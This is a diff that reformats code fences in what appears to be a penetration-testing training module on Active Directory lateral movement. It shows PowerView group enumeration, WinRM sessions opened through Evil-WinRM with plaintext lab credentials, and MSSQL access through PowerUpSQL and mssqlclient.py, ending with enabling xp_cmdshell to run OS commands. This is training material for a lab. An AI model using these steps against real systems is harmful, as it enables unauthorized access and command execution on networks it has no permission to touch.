@@ -40,8 +40,7 @@ Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.
 
 #### Enumerating the Remote Desktop Users Group
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
 
 ComputerName : ACADEMY-EA-MS01
@@ -78,8 +77,7 @@ Like RDP, we may find that either a specific user or an entire group has WinRM a
 
 #### Enumerating the Remote Management Users Group
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
 
 ComputerName : ACADEMY-EA-MS01
@@ -111,8 +109,7 @@ We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/mod
 
 #### Establishing WinRM Session from Windows
 
-```
-        powershell
+```powershell
 PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
 PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
 PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
@@ -129,8 +126,7 @@ To use `evil-winrm` we can install it using the following command:
 
 #### Installing Evil-WinRM
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ gem install evil-winrm
 ```
 
@@ -138,8 +134,7 @@ Typing `evil-winrm` will give us the help menu and all of the available commands
 
 #### Viewing Evil-WinRM's Help Menu
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm 
 
 Evil-WinRM shell v3.3
@@ -171,8 +166,7 @@ We can connect with just an IP address and valid credentials.
 
 #### Connecting to a Target with Evil-WinRM and Valid Credentials
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
 
 Enter Password: 
@@ -216,8 +210,7 @@ First, let's hunt for SQL server instances.
 
 #### Enumerating MSSQL Instances with PowerUpSQL
 
-```
-        powershell
+```powershell
 PS C:\htb> cd .\PowerUpSQL\
 PS C:\htb>  Import-Module .\PowerUpSQL.ps1
 PS C:\htb>  Get-SQLInstanceDomain
@@ -234,8 +227,7 @@ LastLogon        : 4/6/2022 11:59 AM
 
 We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.
 
-```
-        powershell
+```powershell
 PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
 
 VERBOSE: 172.16.5.150,1433 : Connection Success.
@@ -249,8 +241,7 @@ We can also authenticate from our Linux attack host using [mssqlclient.py](https
 
 #### Displaying mssqlclient.py Options
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mssqlclient.py 
 
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
@@ -269,8 +260,7 @@ positional arguments:
 
 #### Running mssqlclient.py Against the Target
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -289,8 +279,7 @@ Once connected, we could type `help` to see what commands are available to us.
 
 #### Viewing our Options with Access to the SQL Server
 
-```
-        shellsession
+```shellsession
 SQL> help
 
      lcd {path}                 - changes the current local directory to {path}
@@ -306,8 +295,7 @@ We could then choose `enable_xp_cmdshell` to enable the [xp\_cmdshell stored pro
 
 #### Choosing enable\_xp\_cmdshell
 
-```
-        shellsession
+```shellsession
 SQL> enable_xp_cmdshell
 
 [*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -318,8 +306,7 @@ Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can 
 
 #### Enumerating our Rights on the System using xp\_cmdshell
 
-```
-        shellsession
+```shellsession
 xp_cmdshell whoami /priv
 output                                                                             
 
